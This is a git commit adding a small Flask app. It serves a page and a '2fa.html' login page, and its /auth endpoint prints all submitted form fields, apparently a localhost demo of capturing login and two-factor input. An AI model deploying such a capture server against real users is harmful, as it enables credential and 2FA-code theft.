d26d0e22d4808e2f71f75d76df573db4e56e476a
sanishdai <sanishbhattrai078@gmail.com>
2025-03-18 09:05:02 +0545

    Add files via upload

---
+++ app.py
@@ -0,0 +1,23 @@
+from flask import Flask
+from flask import render_template, send_file, make_response, request
+
+app = Flask(__name__)
+
+@app.route("/auth", methods=["POST"])
+def auth():
+    print(request.form.to_dict())
+    return "ok"
+
+@app.route("/")
+def index():
+    response = make_response(send_file("index.html"))
+    # Just for localhost demonstration sake
+    response.headers.add("Access-Control-Allow-Origin", "*")
+    return response
+
+@app.route("/login")
+def login():
+    return send_file("2fa.html")
+
+if __name__ == "__main__":
+    app.run(debug=True)
